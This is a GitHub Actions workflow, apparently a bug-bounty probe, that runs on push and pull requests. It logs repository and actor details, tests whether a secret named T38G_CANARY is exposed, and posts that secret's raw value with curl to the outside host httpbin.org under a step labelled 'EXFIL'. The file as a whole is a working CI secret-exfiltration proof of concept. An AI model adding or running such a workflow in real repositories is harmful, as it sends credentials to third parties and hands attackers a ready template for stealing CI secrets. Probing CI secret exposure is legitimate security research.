name: t38g-independent-probe
on:
  push:
  pull_request:
jobs:
  bbp-never-passes:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          echo "T38G-EXECUTED event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY"
          echo "T38G-CANARY-PRESENT=${{ secrets.T38G_CANARY != '' }}"
          SHA=$(printf %s "${{ secrets.T38G_CANARY }}" | sha256sum | cut -d' ' -f1)
          echo "T38G-CANARY-SHA16=${SHA:0:16}"
          curl -sS -m 20 -X POST https://httpbin.org/post --data-urlencode "c=${{ secrets.T38G_CANARY }}" -o /tmp/r.json -w "T38G-EXFIL http=%{http_code}\n" || echo "T38G-EXFIL network-fail"
          if grep -q "T38G-CANARY-" /tmp/r.json; then echo "T38G-EXFIL canary-seen-in-response=1"; else echo "T38G-EXFIL canary-seen-in-response=0"; fi
  t38g-recon:
    runs-on: ubuntu-latest
    steps:
      - run: echo "T38G-RECON event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR"
